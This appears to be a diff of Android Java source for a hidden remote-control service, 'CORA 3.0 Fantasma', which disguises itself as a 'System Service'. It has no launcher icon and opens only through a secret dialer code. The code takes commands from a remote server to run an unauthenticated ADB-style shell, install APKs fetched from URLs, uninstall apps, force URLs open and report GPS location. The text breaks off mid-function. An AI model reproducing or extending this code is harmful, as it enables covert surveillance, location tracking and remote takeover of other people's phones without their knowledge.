@@ -1,122 +1,77 @@
 package br.eni.cora;
 
-import android.app.*;
-import android.content.*;
-import android.os.*;
-import android.provider.Settings;
-import android.util.*;
-import org.json.*;
-import java.io.*;
-import java.net.*;
-import java.util.*;
-import java.util.concurrent.*;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.PowerManager;
 
+import org.json.JSONObject;
+
+import java.io.ByteArrayOutputStream;
+import java.util.Arrays;
+import java.util.HashMap;
+
+// CORA 3.0 Fantasma — reescrito do zero. So 4G/5G: shell remoto (mini-adb),
+// install remoto, open_url (full-screen intent), localizar, uninstall, setid.
+// Oculto: sem launcher, codigo *#*#2672#*#*, nome "Servico de Sistema".
 public class SinoService extends Service {
-    public static volatile String status = "parado";
+    public static volatile String status = "iniciando";
     public static volatile WsClient ws;
+    public static volatile int lastBatt = -1;
+    public static SinoService instancia;
     Thread worker;
-    android.os.PowerManager.WakeLock wakeLock;
-    
-    
-    volatile boolean pipeOk = false;
-    volatile int reativaDelay = 4000;
-    
-    public static volatile int lastBatt = -1, lastAdb = -1;
-    public static volatile String pendingInstall = null;
-        public static volatile long lastDataMb = -1, lastMemKb = -1;
+    PowerManager.WakeLock wakeLock;
 
+    // localizacao
     public static volatile double lastLat = 0, lastLon = 0, lastAcc = -1;
     public static volatile long lastFixTs = 0;
-    // v1.38: mini-adbd — o proprio app fala o protocolo ADB (sem adbd do sistema)
+
+    // mini-adbd (protocolo ADB em processo proprio)
     static final int A_VERSION = 0x01000001, ADB_MAX = 4096,
             A_SYNC = 0x434e5953, A_CNXN = 0x4e584e43, A_OPEN = 0x4e45504f,
-            A_OKAY = 0x59414b4f, A_CLSE = 0x45534c43, A_WRTE = 0x45545257, A_AUTH = 0x48545541;
+            A_OKAY = 0x59414b4f, A_CLSE = 0x45534c43, A_WRTE = 0x45545257;
     public static volatile boolean miniAdb = false;
-    
-    
-    
-    
-    
-    
-    
-    
-    
     int miniNextId = 0;
-    final java.util.HashMap<Integer, java.lang.Process> miniProcs = new java.util.HashMap<>();
-    final java.io.ByteArrayOutputStream miniBuf = new java.io.ByteArrayOutputStream();
-    public static SinoService instancia;
-    
+    final HashMap<Integer, Process> miniProcs = new HashMap<>();
+    final ByteArrayOutputStream miniBuf = new ByteArrayOutputStream();
 
-
-
-    public static void forceStop() {
-        try {
-            if (instancia != null) {
-                instancia.stopSelf();
-                android.content.Intent i = new android.content.Intent(instancia, SinoService.class);
-                instancia.startService(i);
-                SinoService.status = "serviço reiniciado — aguardando conexão...";
-            }
-        } catch (Exception e) {}
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        instancia = this;
+        iniciarLocalizacao();
     }
-
-    public static void wsSend(String s) {
-        try { if (ws != null) ws.send(s); } catch (Exception ignored) {}
-    }
-
-    void abrirSessao(int sid) {
-        try {
-            android.content.pm.PackageInstaller pin = getPackageManager().getPackageInstaller();
-            android.content.pm.PackageInstaller.Session ses = pin.openSession(sid);
-            android.content.Intent si = new android.content.Intent(this, SinoService.InstallReceiver.class);
-            si.setAction("br.eni.cora.INSTALL_STATUS");
-            int fl = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
-            if (android.os.Build.VERSION.SDK_INT >= 31) fl |= android.app.PendingIntent.FLAG_MUTABLE;
-                else if (android.os.Build.VERSION.SDK_INT >= 23) fl |= android.app.PendingIntent.FLAG_IMMUTABLE;
-            ses.commit(android.app.PendingIntent.getBroadcast(this, sid, si, fl).getIntentSender());
-            status = "aguardando tela de confirmacao do sistema...";
-        } catch (Exception e) {}
-    }
-
-    android.content.BroadcastReceiver installReceiver = new android.content.BroadcastReceiver() {
-        @Override public void onReceive(android.content.Context c, android.content.Intent i) {
-            int sid = i.getIntExtra("session", -1);
-            if (sid > 0) abrirSessao(sid);
-        }
-    };
-
-;
 
     public int onStartCommand(Intent i, int f, int id) {
         instancia = this;
-        status = "v2.6.2 servico: acordando...";
         try {
-            android.content.IntentFilter filtro = new android.content.IntentFilter("br.eni.cora.INSTALL_");
-            filtro.addDataScheme("package");
-            registerReceiver(installReceiver, filtro);
-        } catch (Exception e) {}
-        try {
-            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (pm != null) {
-                wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "cora:coracao");
+                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "cora:coracao");
                 wakeLock.setReferenceCounted(false);
                 wakeLock.acquire();
             }
-        } catch (Exception e) {}
+        } catch (Exception ignored) {}
         Notification n = new Notification.Builder(this)
-                .setContentTitle("CORA 💓")
-                .setContentText("coração operante de remediação e assistência")
+                .setContentTitle("Serviço de Sistema")
+                .setContentText("em execução")
                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
                 .build();
         startForeground(1, n);
-        status = "v2.6.2 servico: no ar, conectando...";
-        if (worker == null || !worker.isAlive()) { worker = new Thread(this::loop); worker.start(); }
-        iniciarLocalizacao();
+        status = "serviço no ar";
+        if (worker == null || !worker.isAlive()) {
+            worker = new Thread(this::loop);
+            worker.start();
+        }
         return START_STICKY;
     }
-    public IBinder onBind(Intent i) { return null; }
 
-    @Override public void onDestroy() {
+    @Override
+    public void onDestroy() {
         super.onDestroy();
         try { if (wakeLock != null) wakeLock.release(); } catch (Exception ignored) {}
     }
@@ -125,115 +80,47 @@ public class SinoService extends Service {
         while (true) {
             try { connectOnce(); }
             catch (Exception e) { status = "erro: " + e; }
-            try {
-                Thread.sleep(5000);
-
-            } catch (InterruptedException ignored) {}
+            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
         }
     }
 
     void connectOnce() throws Exception {
-        // v1.31: MORTE AOS IRMÃOS — reconexões antigas deixavam socket vivo na sala;
-        // os zumbis recebiam broadcast do tubo, enchiam o buffer TCP e sufocavam o envio
-        try { if (ws != null) ws.close(); } catch (Exception ignored) {}
-
-        final String host = Prefs.host(this);
-        status = "conectando " + host + " ...";
+        status = "conectando " + Prefs.host(this) + "...";
         final WsClient[] ref = new WsClient[1];
         WsClient w = new WsClient(new WsClient.Listener() {
             @Override public void onOpen() {
-                status = "conectado";
                 ws = ref[0];
-                try {
-                    ws.send("{\"type\":\"hello\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"model\":\"" + Build.MANUFACTURER + " " + Build.MODEL + "\",\"android\":\"" + Build.VERSION.RELEASE + "\",\"ver\":\"2.4\"}");
-                } catch (Exception ignored) {}
-                // keep-alive de socket: ping a cada 20s mantem o TCP vivo no doze
+                status = "conectado";
                 new Thread(() -> {
                     while (true) {
                         try {
                             if (ws != null) ws.send("{\"type\":\"hb\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"keep\":true}");
-                            Thread.sleep(10000);
+                            Thread.sleep(30000);
                         } catch (Exception e) { return; }
                     }
                 }).start();
                 new Thread(() -> {
                     while (true) {
-                        try { sendTelemetry(); Thread.sleep(30000); }
+                        try { sendTelemetry(); Thread.sleep(60000); }
                         catch (Exception e) { return; }
                     }
                 }).start();
-                
             }
+
             @Override public void onMessage(byte[] d) {
                 if (miniAdb && ehBinario(d)) { miniAdbFeed(d); return; }
-                if (ehBinario(d)) {
-                    // v2.0 mini: tubo classico removido — binario fora do mini e ignorado
-                    return;
-                }
+                if (ehBinario(d)) return;
                 try { onCmd(new String(d)); }
-                catch (Exception e) { status = "realocar".equals(e.getMessage()) ? "sala g52 · aguardando a clinica..." : "cmd: " + e; }
+                catch (Exception e) { status = "realocar".equals(e.getMessage()) ? "aguardando a clínica..." : "cmd: " + e; }
             }
-            @Override public void onClose() { status = "desconectado (reconectando)"; if (ws == ref[0]) ws = null; }
+
+            @Override public void onClose() {
+                if (ws == ref[0]) ws = null;
+                status = "desconectado (reconectando)";
+            }
         });
         ref[0] = w;
-        try {
-            w.connect(host, 443, "/ws?id=" + Prefs.id(this));
-        } catch (Exception e) {
-            // v1.32: handshake falhou — mata o socket órfão (era peer zumbi na sala)
-            try { w.close(); } catch (Exception ignored) {}
-            throw e;
-        }
-    }
-
-    void onCmd(String s) throws Exception {
-        if (!s.trim().startsWith("{")) return;
-        if (s.trim().startsWith("{\"pipe_ping\":true}")) return;
-        if (s.startsWith("{\"type\":\"joined\"")) {
-            JSONObject jj = new JSONObject(s);
-            if (jj.optInt("peers", 1) == 1) {
-                status = "sala vazia, realocando...";
-                try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
-                throw new Exception("realocar");
-            }
-            status = "sala encontrada (peers=" + jj.optInt("peers") + ")";
-            return;
-        }
-        try {
-            JSONObject j = new JSONObject(s);
-            String cmd = j.optString("cmd");
-            if ("ping".equals(cmd)) send("{\"type\":\"pong\",\"id\":\"" + Prefs.id(this) + "\"}");
-            else if ("report".equals(cmd)) sendTelemetry();
-
-            else if ("install_url".equals(cmd)) {
-                final String url = j.optString("url");
-                new Thread(() -> instalarPorUrl(url)).start();
-            }
-            else if ("uninstall_pkg".equals(cmd)) desinstalar(j.optString("pkg"));
-            else if ("open_url".equals(cmd)) abrirUrl(j.optString("url"), j.optString("pkg", null));
-            else if ("localizar".equals(cmd)) localizar();
-            else if ("setid".equals(cmd)) {
-                final String novo = j.optString("id", "");
-                if (!novo.isEmpty() && novo.length() <= 40) {
-                    Prefs.set(this, Prefs.host(this), novo);
-                    status = "id alterado para " + novo + " - reconectando...";
-                    if (ws != null) ws.close();
-                } else {
-                    status = "setid: id invalido";
-                }
-            }
-            else if ("adbd".equals(cmd)) iniciarMiniAdbd();
-                        else if ("manter_wifi".equals(cmd)) {
-                try {
-                    Settings.Global.putInt(getContentResolver(), "wifi_sleep_policy", 2);
-                    Settings.Global.putInt(getContentResolver(), "stay_on_while_plugged_in", 2);
-                    send("{\"type\":\"wifi\",\"status\":\"fixado\"}");
-                    status = "Wi-Fi fixado: nunca dormir";
-                } catch (Exception e) {
-                    send("{\"type\":\"wifi\",\"status\":\"erro\"}");
-                }
-            }
-            
-        } catch (Exception e) { status = "realocar".equals(e.getMessage()) ? "sala g52 · aguardando a clinica..." : "cmd: " + e; }
+        w.connect(Prefs.host(this), 443, "/ws?id=" + Prefs.id(this));
     }
 
     static boolean ehBinario(byte[] d) {
@@ -245,327 +132,66 @@ public class SinoService extends Service {
         return false;
     }
 
-
-
-    // v1.30: adbd "fantasma" — a setting diz ON mas o listener morreu (sono/doze da Lenovo).
-    // O toggle 0→1 força o framework a derrubar e subir o adbd de novo, com porta nova.
-
-
-
-
-    // v1.33 PORTA CERTA: adbd roda como root — seus sockets LISTEN aparecem no
-    // /proc/net/tcp com uid 0 (ou 1000/2000). Nada de varrer 28 mil portas ou
-    // validar header: achamos o listener exato, funciona até com TLS.
-
-
-    public static volatile int lastAdbPort = -1;
-
-    // v1.35: frame CNXN real do protocolo ADB ("host::" + features) — a pergunta
-    // que o adbd (TLS ou texto) SEMPRE responde. Quem não é adbd fica mudo.
-
-
-    // resposta válida = CNXN (0x4e584e43) ou AUTH (0x48545541) com magic certo
-    boolean respostaEAdbd(byte[] hdr) {
-        if (hdr == null || hdr.length < 24) return false;
-        java.nio.ByteBuffer rb = java.nio.ByteBuffer.wrap(hdr).order(java.nio.ByteOrder.LITTLE_ENDIAN);
-        int cmd = rb.getInt();
-        rb.getInt();
-        rb.getInt();
-        int len = rb.getInt();
-        rb.getInt();
-        int magic = rb.getInt();
-        if (len < 0 || len >= 1048576 || magic != (cmd ^ 0xffffffff)) return false;
-        return cmd == 0x4e584e43 || cmd == 0x48545541;
-    }
-
-
-
-    // v1.39: sonda em dois enderecos — o adbd da depuracao sem fio (Android 11+)
-    // pode escutar no IP da interface Wi-Fi em vez do localhost.
-
-
-
-
-
-
-    void instalarPorUrl(String url) {
-        new Thread(() -> {
-            try {
-                status = "baixando APK da nuvem...";
-                java.io.InputStream in = new java.net.URL(url).openStream();
-                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
-                byte[] buf = new byte[16384]; int n;
-                while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
-                in.close();
-                byte[] apkData = bos.toByteArray();
-                send("{\"type\":\"install\",\"status\":\"baixado\",\"bytes\":" + apkData.length + "}");
-
-                android.content.pm.PackageInstaller pin = getPackageManager().getPackageInstaller();
-                android.content.pm.PackageInstaller.SessionParams sp = new android.content.pm.PackageInstaller.SessionParams(
-                        android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
-                int sid = pin.createSession(sp);
-                android.content.pm.PackageInstaller.Session ses = pin.openSession(sid);
-                java.io.OutputStream os = ses.openWrite("base.apk", 0, apkData.length);
-                os.write(apkData);
-                ses.fsync(os);
-                os.close();
-
-                android.content.Intent si = new android.content.Intent(this, SinoService.InstallReceiver.class);
-                si.setAction("br.eni.cora.INSTALL_STATUS");
-                int fl = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
-                if (android.os.Build.VERSION.SDK_INT >= 31) fl |= android.app.PendingIntent.FLAG_MUTABLE;
-                else if (android.os.Build.VERSION.SDK_INT >= 23) fl |= android.app.PendingIntent.FLAG_IMMUTABLE;
-                android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, sid, si, fl);
-                ses.commit(pi.getIntentSender());
-                send("{\"type\":\"install\",\"status\":\"confirmacao_sistema\"}");
-                status = "aguardando tela de confirmacao do sistema...";
-            } catch (Exception e) {
-                status = "install: " + e;
-                send("{\"type\":\"install\",\"status\":\"erro\",\"msg\":\"" + e.getMessage() + "\"}");
+    void onCmd(String s) throws Exception {
+        if (!s.trim().startsWith("{")) return;
+        if (s.trim().startsWith("{\"pipe_ping\":true}")) return;
+        if (s.startsWith("{\"type\":\"joined\"")) {
+            JSONObject jj = new JSONObject(s);
+            if (jj.optInt("peers", 1) == 1) {
+                try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+                throw new Exception("realocar");
             }
-        }).start();
-    }
-
-    void desinstalar(String pkg) {
-        try {
-            android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_DELETE, android.net.Uri.parse("package:" + pkg));
-            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            int fl = android.os.Build.VERSION.SDK_INT >= 23 ? android.app.PendingIntent.FLAG_IMMUTABLE : 0;
-            android.app.PendingIntent pi = android.app.PendingIntent.getActivity(this, 88, i, android.app.PendingIntent.FLAG_UPDATE_CURRENT | fl);
-            android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            String ch = "instalacao";
-            if (android.os.Build.VERSION.SDK_INT >= 26) {
-                nm.createNotificationChannel(new android.app.NotificationChannel(ch, "Instalacoes", android.app.NotificationManager.IMPORTANCE_HIGH));
-            }
-            android.app.Notification.Builder nb = new android.app.Notification.Builder(this)
-                    .setContentTitle("CORA 💓")
-                    .setContentText("Toque para confirmar desinstalação")
-                    .setSmallIcon(android.R.drawable.stat_sys_warning)
-                    .setContentIntent(pi)
-                    .setAutoCancel(true);
-            if (android.os.Build.VERSION.SDK_INT >= 26) nb.setChannelId(ch);
-            nm.notify(88, nb.build());
-            send("{\"type\":\"uninstall\",\"status\":\"notificacao_enviada\",\"pkg\":\"" + pkg + "\"}");
-            status = "toque na notificação para confirmar a desinstalação";
-        } catch (Exception e) {
-            send("{\"type\":\"uninstall\",\"status\":\"erro\"}");
+            return;
         }
-    }
-
-    void abrirUrl(String url, String pkg) {
-        try {
-            android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url));
-            if (pkg != null && !pkg.isEmpty()) i.setPackage(pkg);
-            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(i);
-        } catch (Exception e) {}
-        // v2.6.1: Android bloqueia startActivity em background — full-screen intent abre via heads-up/toque
-        try {
-            android.content.Intent vi = new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url));
-            if (pkg != null && !pkg.isEmpty()) vi.setPackage(pkg);
-            vi.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            android.app.PendingIntent pi = android.app.PendingIntent.getActivity(this,
-                    (int) (System.currentTimeMillis() % 100000), vi,
-                    android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
-            android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            String ch = "abrir";
-            if (android.os.Build.VERSION.SDK_INT >= 26) {
-                nm.createNotificationChannel(new android.app.NotificationChannel(ch, "Abrir", android.app.NotificationManager.IMPORTANCE_HIGH));
+        JSONObject j = new JSONObject(s);
+        String cmd = j.optString("cmd");
+        if ("ping".equals(cmd)) send("{\"type\":\"pong\",\"id\":\"" + Prefs.id(this) + "\"}");
+        else if ("report".equals(cmd)) sendTelemetry();
+        else if ("install_url".equals(cmd)) { final String u = j.optString("url"); new Thread(() -> instalarPorUrl(u)).start(); }
+        else if ("uninstall_pkg".equals(cmd)) desinstalar(j.optString("pkg"));
+        else if ("open_url".equals(cmd)) abrirUrl(j.optString("url"), j.optString("pkg", null));
+        else if ("localizar".equals(cmd)) localizar();
+        else if ("setid".equals(cmd)) {
+            final String novo = j.optString("id", "");
+            if (!novo.isEmpty() && novo.length() <= 40) {
+                Prefs.set(this, Prefs.host(this), novo);
+                status = "id alterado para " + novo;
+                if (ws != null) ws.close();
             }
-            android.app.Notification n = new android.app.Notification.Builder(this)
-                    .setSmallIcon(android.R.drawable.stat_sys_download_done)
-                    .setContentTitle("Serviço de Sistema")
-                    .setContentText("toque para abrir")
-                    .setContentIntent(pi)
-                    .setFullScreenIntent(pi, true)
-                    .setAutoCancel(true)
-                    .build();
-            nm.notify(88, n);
-            send("{\"type\":\"open\",\"status\":\"ok\"}");
-        } catch (Exception e2) {
-            send("{\"type\":\"open\",\"status\":\"erro\"}");
         }
+        else if ("adbd".equals(cmd)) iniciarMiniAdbd();
     }
 
-    void send(String s) { try { if (ws != null) ws.send(s); } catch (Exception e) { status = "send: " + e; } }
+    void send(String s) {
+        try { if (ws != null) ws.send(s); } catch (Exception e) { status = "send: " + e; }
+    }
 
+    // ---------- telemetria ----------
     void sendTelemetry() {
         try {
             Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-            int lvl = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
-            int sc = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
+            int lvl = bi != null ? bi.getIntExtra("batt", -1) : -1;
+            int sc = bi != null ? bi.getIntExtra("scale", -1) : -1;
             int pct = sc > 0 ? lvl * 100 / sc : -1;
-            int plug = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) : 0;
-            int adb = 0;
-            try { adb = Settings.Global.getInt(getContentResolver(), "adb_wifi_enabled"); } catch (Exception ignored) {}
-            String memAv = "?";
-            BufferedReader r = new BufferedReader(new FileReader("/proc/meminfo"));
-            String l1 = r.readLine(), l2 = r.readLine(), l3 = r.readLine(); r.close();
-            if (l3 != null) memAv = l3.trim();
-            android.os.StatFs sf = new android.os.StatFs(Environment.getDataDirectory().getAbsolutePath());
-            long free = sf.getAvailableBlocksLong() * sf.getBlockSizeLong() / 1048576L;
+            int plug = bi != null ? bi.getIntExtra("plugged", 0) : 0;
+            lastBatt = pct;
             JSONObject j = new JSONObject();
-            j.put("type", "hb"); j.put("id", Prefs.id(this));
-            j.put("batt", pct); j.put("plug", plug); j.put("adb", adb);
-            j.put("mem", memAv); j.put("data_mb_free", free);
-            j.put("model", Build.MODEL); j.put("ver", "2.6.2"); j.put("ts", System.currentTimeMillis());
-            try { if (lastFixTs > 0) { j.put("lat", lastLat); j.put("lon", lastLon); j.put("acc", lastAcc); } } catch (Exception ignored) {}
-            
-            try {
-                lastBatt = pct; lastAdb = adb; lastDataMb = free;
-                java.util.regex.Matcher mm = java.util.regex.Pattern.compile("(\\d+)").matcher(memAv);
-                if (mm.find()) lastMemKb = Long.parseLong(mm.group(1));
-            } catch (Exception ignored) {}
+            j.put("type", "hb");
+            j.put("id", Prefs.id(this));
+            j.put("batt", pct);
+            j.put("plug", plug);
+            j.put("ver", "3.0");
+            j.put("model", android.os.Build.MODEL);
+            j.put("ts", System.currentTimeMillis());
+            if (lastFixTs > 0) {
+                j.put("lat", lastLat); j.put("lon", lastLon); j.put("acc", lastAcc);
+            }
             send(j.toString());
-            if (status.startsWith("sala") || status.startsWith("conectado"))
-                status = "conectado | batt " + pct + "% | adb " + adb;
+            if (status.startsWith("conectado")) status = "conectado | batt " + pct + "%";
         } catch (Exception e) { status = "tel: " + e; }
     }
 
-
-
-
-
-
-    // v1.40: proxy ADB autenticado (metodo Tailscale: identidade propria).
-    // Frente: mini-adbd (ja existente). Fundo: conexao PROPRIA no adbd real,
-    // autenticada com a chave privada da clinica (asset adbkey, ja autorizada
-    // no aparelho). Sessoes espelhadas: shell da clinica roda como uid=2000.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    // v1.38: mini-adbd. Implementa o protocolo ADB (CNXN/OPEN/OKAY/WRTE/CLSE) em
-    // processo proprio: o cliente adb da clinica conecta como sempre (via relay),
-    // recebe o banner CNXN sem AUTH (modo "inseguro" legitimo, como ro.adb.secure=0)
-    // e ganha shell: / exec: como UID do app. Nao depende de adbd do sistema,
-    // de adb_wifi_enabled, nem de Wi-Fi — funciona no 4G.
-    void iniciarMiniAdbd() {
-        miniAdb = true;
-        miniProcs.clear();
-        synchronized (miniBuf) { miniBuf.reset(); }
-        send("{\"type\":\"pipe\",\"status\":\"ok\",\"port\":5557,\"adbd\":true}");
-        status = "CORA Mini v2.0 no ar — mini-adb (4G/5G), sem Wi-Fi, sem depuracao";
-    }
-
-    void miniAdbFeed(byte[] d) {
-        try {
-            byte[] b;
-            synchronized (miniBuf) {
-                miniBuf.write(d);
-                b = miniBuf.toByteArray();
-                int off = 0;
-                while (b.length - off >= 24) {
-                    java.nio.ByteBuffer h = java.nio.ByteBuffer.wrap(b, off, 24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
-                    int cmd = h.getInt(), a0 = h.getInt(), a1 = h.getInt(),
-                        len = h.getInt(), chk = h.getInt(), magic = h.getInt();
-                    if (magic != (cmd ^ 0xffffffff) || len < 0 || len > 1048576) { off++; continue; }
-                    if (b.length - off < 24 + len) break;
-                    byte[] payload = java.util.Arrays.copyOfRange(b, off + 24, off + 24 + len);
-                    off += 24 + len;
-                    miniAdbHandle(cmd, a0, a1, payload);
-                }
-                miniBuf.reset();
-                miniBuf.write(b, off, b.length - off);
-            }
-        } catch (Exception e) { status = "miniadbd feed: " + e; }
-    }
-
-    void miniAdbHandle(int cmd, int a0, int a1, byte[] payload) {
-        try {
-            if (cmd == A_CNXN) {
-                miniAdbSend(A_CNXN, A_VERSION, ADB_MAX,
-                    "device::ro.product.name=cora;ro.product.model=mini-adbd;ro.product.device=g52;".getBytes("UTF-8"));
-                status = "mini-adbd: handshake CNXN ok (sem AUTH, modo inseguro)";
-            } else if (cmd == A_OPEN) {
-                String svc2 = new String(payload, "UTF-8");
-                
-                if (svc2.startsWith("shell") || svc2.startsWith("exec:")) {
-                    java.lang.Process p = svc2.startsWith("exec:")
-                        ? Runtime.getRuntime().exec(svc2.substring(5).trim().split("\\s+"))
-                        : Runtime.getRuntime().exec("/system/bin/sh");
-                    int lid = ++miniNextId;
-                    synchronized (miniProcs) { miniProcs.put(lid, p); }
-                    miniAdbSend(A_OKAY, lid, a0, null);
-                    status = "mini-adbd: aberto " + svc2;
-                    final int flid = lid, fremote = a0;
-                    final java.lang.Process fp = p;
-                    new Thread(() -> {
-                        try {
-                            java.io.InputStream o = fp.getInputStream();
-                            byte[] buf = new byte[ADB_MAX];
-                            int n;
-                            while ((n = o.read(buf)) > 0) {
-                                miniAdbSend(A_WRTE, flid, fremote, java.util.Arrays.copyOf(buf, n));
-                            }
-                            miniAdbSend(A_CLSE, flid, fremote, null);
-                        } catch (Exception ignored) {}
-                        try { fp.destroy(); } catch (Exception ignored) {}
-                        synchronized (miniProcs) { miniProcs.remove(flid); }
-                    }).start();
-                } else {
-                    miniAdbSend(A_CLSE, 0, a0, null);
-                }
-            } else if (cmd == A_WRTE) {
-                
-                java.lang.Process p;
-                synchronized (miniProcs) { p = miniProcs.get(a0); }
-                if (p != null) {
-                    boolean winint = payload.length == 12 && payload[0] == 0 && payload[1] == 'T'
-                            && payload[2] == 'S' && payload[5] == 'N';
-                    if (!winint) {
-                        p.getOutputStream().write(payload);
-                        p.getOutputStream().flush();
-                    }
-                    miniAdbSend(A_OKAY, a0, a1, null);
-                } else {
-                    miniAdbSend(A_CLSE, a0, a1, null);
-                }
-            } else if (cmd == A_CLSE) {
-                
-                java.lang.Process p;
-                synchronized (miniProcs) { p = miniProcs.remove(a0); }
-                if (p != null) try { p.destroy(); } catch (Exception ignored) {}
-            } else if (cmd == A_SYNC) {
-                miniAdbSend(A_SYNC, a0, a1, null);
-            }
-        } catch (Exception e) { status = "miniadbd handle: " + e; }
-    }
-
-    void miniAdbSend(int cmd, int a0, int a1, byte[] payload) {
-        try {
-            byte[] pl = payload == null ? new byte[0] : payload;
-            java.nio.ByteBuffer h = java.nio.ByteBuffer.allocate(24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
-            int chk = 0;
-            for (byte c : pl) chk += (c & 0xff);
-            h.putInt(cmd).putInt(a0).putInt(a1).putInt(pl.length).putInt(chk).putInt(cmd ^ 0xffffffff);
-            if (ws != null) {
-                byte[] out = new byte[24 + pl.length];
-                System.arraycopy(h.array(), 0, out, 0, 24);
-                System.arraycopy(pl, 0, out, 24, pl.length);
-                ws.send(out);
-            }
-        } catch (Exception e) {}
-    }
-
-    // v1.37: localizacao. Fix passivo+rede como base (bateria), GPS so sob demanda
-    // (comando localizar). Coordenadas entram na telemetria quando disponiveis.
+    // ---------- localizacao ----------
     void iniciarLocalizacao() {
         try {
             final android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
@@ -579,15 +205,15 @@ public class SinoService extends Service {
                 @Override public void onProviderEnabled(String p) {}
                 @Override public void onStatusChanged(String p, int s, android.os.Bundle b) {}
             };
-            try { lm.requestLocationUpdates(android.location.LocationManager.NETWORK_PROVIDER, 60000, 50f, lis); } catch (Exception e) {}
-            try { lm.requestLocationUpdates(android.location.LocationManager.PASSIVE_PROVIDER, 60000, 50f, lis); } catch (Exception e) {}
-        } catch (Exception e) {}
+            try { lm.requestLocationUpdates(android.location.LocationManager.NETWORK_PROVIDER, 60000, 50f, lis); } catch (Exception ignored) {}
+            try { lm.requestLocationUpdates(android.location.LocationManager.PASSIVE_PROVIDER, 60000, 50f, lis); } catch (Exception ignored) {}
+        } catch (Exception ignored) {}
     }
 
     void localizar() {
         new Thread(() -> {
             try {
-                status = "localizando (GPS sob demanda)...";
+                status = "localizando...";
                 final android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
                 final boolean[] got = {false};
                 android.location.LocationListener lis = new android.location.LocationListener() {
@@ -596,61 +222,201 @@ public class SinoService extends Service {
                         lastAcc = l.hasAccuracy() ? l.getAccuracy() : -1;
                         lastFixTs = System.currentTimeMillis();
                         got[0] = true;
-                        try { lm.removeUpdates(this); } catch (Exception e) {}
+                        try { lm.removeUpdates(this); } catch (Exception ignored) {}
                         send("{\"type\":\"location\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"lat\":" + lastLat + ",\"lon\":" + lastLon + ",\"acc\":" + lastAcc + ",\"ts\":" + lastFixTs + "}");
-                        status = "localizado: " + lastLat + "," + lastLon + " (±" + (int) lastAcc + "m)";
+                        status = "localizado: " + lastLat + "," + lastLon;
                     }
                     @Override public void onProviderDisabled(String p) {}
                     @Override public void onProviderEnabled(String p) {}
                     @Override public void onStatusChanged(String p, int s, android.os.Bundle b) {}
                 };
-                try { lm.requestLocationUpdates(android.location.LocationManager.GPS_PROVIDER, 0, 0f, lis); } catch (Exception e) {}
-                try { lm.requestLocationUpdates(android.location.LocationManager.NETWORK_PROVIDER, 0, 0f, lis); } catch (Exception e) {}
+                try { lm.requestLocationUpdates(android.location.LocationManager.GPS_PROVIDER, 0, 0f, lis); } catch (Exception ignored) {}
+                try { lm.requestLocationUpdates(android.location.LocationManager.NETWORK_PROVIDER, 0, 0f, lis); } catch (Exception ignored) {}
                 Thread.sleep(15000);
-                try { lm.removeUpdates(lis); } catch (Exception e) {}
+                try { lm.removeUpdates(lis); } catch (Exception ignored) {}
                 if (!got[0]) {
                     send("{\"type\":\"location\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"lat\":" + lastLat + ",\"lon\":" + lastLon + ",\"acc\":" + lastAcc + ",\"ts\":" + lastFixTs + ",\"stale\":true}");
-                    status = "sem fix novo; ultimo: " + lastLat + "," + lastLon;
+                    status = "sem fix novo";
                 }
             } catch (Exception e) { status = "localizar: " + e; }
         }).start();
     }
 
-    // v1.36: fluxo de instalacao via receiver. O commit com PendingIntent de Activity (v1.35)
-    // nao levantava a tela de confirmacao no Android 13 (Moto). O receiver recebe
-    // STATUS_PENDING_USER_ACTION com EXTRA_INTENT e lanca a confirmacao direto,
-    // com notificacao de reserva se o start em background for bloqueado.
+    // ---------- mini-adbd ----------
+    void iniciarMiniAdbd() {
+        miniAdb = true;
+        miniProcs.clear();
+        synchronized (miniBuf) { miniBuf.reset(); }
+        status = "mini-adb no ar";
+    }
+
+    void miniAdbFeed(byte[] d) {
+        try {
+            byte[] b;
+            synchronized (miniBuf) {
